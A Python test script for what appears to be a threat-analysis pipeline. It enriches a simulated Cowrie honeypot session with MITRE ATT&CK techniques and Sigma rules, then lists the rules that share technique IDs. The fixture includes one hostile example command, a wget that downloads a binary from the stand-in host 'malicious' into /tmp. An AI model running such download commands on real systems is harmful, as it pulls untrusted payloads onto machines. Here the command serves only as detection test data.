# tests/rag_crosslink_test.py

from ai.rag.query import enrich_session_with_mitre
from ai.rag.sigma_query import enrich_session_with_sigma

def extract_mitre_ids(mitre_candidates):
    out = []
    for m in mitre_candidates:
        tid = m.get("tid")
        if tid:
            out.append(tid)
    return out


def extract_sigma_mitre_ids(sigma_candidates):
    mapping = {}  # sid → list of MITRE IDs
    for s in sigma_candidates:
        mts = s.get("mitre_techniques", "")
        if mts:
            mapping[s["sid"]] = [t.strip() for t in mts.split(",") if t.strip()]
        else:
            mapping[s["sid"]] = []
    return mapping


# Same test session
test = {
    "session_id": "x",
    "sensor": "Cowrie",
    "attack_intent": "malware_drop",
    "summary": "Attacker downloaded a suspicious ELF binary via wget.",
    "key_indicators": {
        "src_ip": "1.2.3.4",
        "dest_ip": "10.20.20.10",
        "src_ports": [44444],
        "dest_ports": [22],
        "protocols": ["ssh"],
        "commands": ["wget http://malicious/file.bin -O /tmp/x"],
        "urls": ["http://malicious/file.bin"],
        "signatures": [],
        "files": ["/tmp/x"],
    },
    "confidence": 0.9,
    "risk_score": 7,
    "timestamp_range": {"start": "2025-09-01", "end": "2025-09-01"},
}

# STEP 1 — MITRE enrichment
with_mitre = enrich_session_with_mitre(test, top_k=5)
mitre_ids = extract_mitre_ids(with_mitre["mitre_candidates"])

print("MITRE techniques:", mitre_ids)

# STEP 2 — Sigma enrichment
with_sigma = enrich_session_with_sigma(with_mitre, top_k=15)
sigma_map = extract_sigma_mitre_ids(with_sigma["sigma_candidates"])

print("\nCross-linked Sigma rules:")
for sid, s_mitres in sigma_map.items():
    # Show only Sigma rules that share MITRE IDs with this session
    shared = set(mitre_ids).intersection(s_mitres)
    if shared:
        print({
            "sid": sid,
            "shared_mitre": list(shared),
        })
